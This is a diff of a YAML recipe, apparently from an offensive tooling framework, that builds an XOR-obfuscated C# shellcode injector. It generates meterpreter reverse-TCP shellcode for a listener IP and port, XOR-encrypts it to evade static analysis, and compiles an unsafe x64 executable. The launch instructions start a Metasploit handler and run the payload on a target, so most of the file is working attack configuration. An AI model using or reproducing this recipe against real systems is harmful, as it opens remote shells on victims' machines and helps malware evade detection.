@@ -5,16 +5,16 @@ meta:
     Simple XOR-encoded shellcode injector using C#.
     Uses single-byte XOR key (0xfa) for basic obfuscation.
     Similar to the classic XorCoder pattern.
-    
+
     This is a simpler alternative to AES encryption, useful for
     evading basic static analysis while maintaining simplicity.
-  
+
   effectiveness: "medium"
-  
+
   mitre:
     tactic: "TA0005 - Defense Evasion"
     technique: "T1027 - Obfuscated Files or Information"
-  
+
   artifacts:
     - "XOR-encoded shellcode in binary"
     - "Simple decode loop in code"
@@ -25,25 +25,25 @@ parameters:
     type: "ip"
     description: "Listener IP address"
     required: true
-  
+
   - name: "lport"
     type: "port"
     description: "Listener port"
     required: true
     default: 4444
-  
+
   - name: "xor_key"
     type: "hex"
     description: "XOR key (single byte, e.g., 'fa')"
     required: false
     default: "fa"
-  
+
   - name: "output_file"
     type: "string"
     description: "Output executable filename"
     required: true
     default: "xor_injector.exe"
-  
+
   - name: "output_path"
     type: "path"
     description: "Output directory"
@@ -59,7 +59,7 @@ preprocessing:
         LHOST={{ lhost }} LPORT={{ lport }} \
         EXITFUNC=thread -f raw
     output_var: "raw_shellcode"
-  
+
   # Step 2: Base64 encode for processing
   - type: "script"
     name: "encode_b64"
@@ -67,7 +67,7 @@ preprocessing:
     args:
       data: "{{ raw_shellcode }}"
     output_var: "shellcode_b64"
-  
+
   # Step 3: XOR encrypt with fixed key
   - type: "script"
     name: "xor_encryption"
@@ -76,7 +76,7 @@ preprocessing:
       data: "{{ shellcode_b64 }}"
       key: "{{ xor_key }}"
     output_var: "xor_result"
-  
+
   # Step 4: Format as C# byte array
   - type: "script"
     name: "format_payload"
@@ -90,7 +90,7 @@ preprocessing:
 output:
   type: "template"
   template: "shellcode_injection/xor_injector.cs"
-  
+
   compile:
     enabled: true
     compiler: "mcs"
@@ -98,12 +98,12 @@ output:
       - "-out:{{ output_path }}/{{ output_file }}"
       - "-platform:x64"
       - "-unsafe"
-  
+
   launch_instructions: |
     # Start Metasploit listener
     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
-    
+
     # Execute on target
     {{ output_file }}
-    
+
     # Note: Payload is XOR-encoded with key 0x{{ xor_key }}
